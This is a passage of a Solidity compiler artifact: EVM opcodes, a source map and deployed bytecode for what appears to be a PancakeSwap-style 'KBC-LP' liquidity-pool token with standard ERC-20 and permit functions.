SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0x5F 0x24 0xF6 LOG3 INVALID PC 0xEC SWAP9 SWAP2 0xAD 0xDF PUSH27 0xA87A0A838A4CE532EC73425D05FAE792E93D66F64736F6C634300 SDIV LT STOP ORIGIN GASLIMIT 0x49 POP CALLDATACOPY BALANCE ORIGIN DIFFICULTY PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 ",
							"sourceMap": "139:4344:0:-;;;1059:485;8:9:-1;5:2;;;30:1;27;20:12;5:2;-1:-1;1245:133:0;;1149:7;;1245:133;;;;;;;;;;;;;;;;1412:4;;;;;;;;-1:-1:-1;;;1412:4:0;;;;;1446:10;;;;;;;;;;-1:-1:-1;;;1446:10:0;;;;1217:310;;;;;;;;;1396:22;1217:310;;;;1436:21;1217:310;;;;;;;;;;;1508:4;1217:310;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1217:310:0;;;;;;1194:343;;;;;;;;1175:16;:362;-1:-1:-1;139:4344:0;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a723158205f24f6a3fe58ec9891addf7a0a87a0a838a4ce532ec73425d05fae792e93d66f64736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 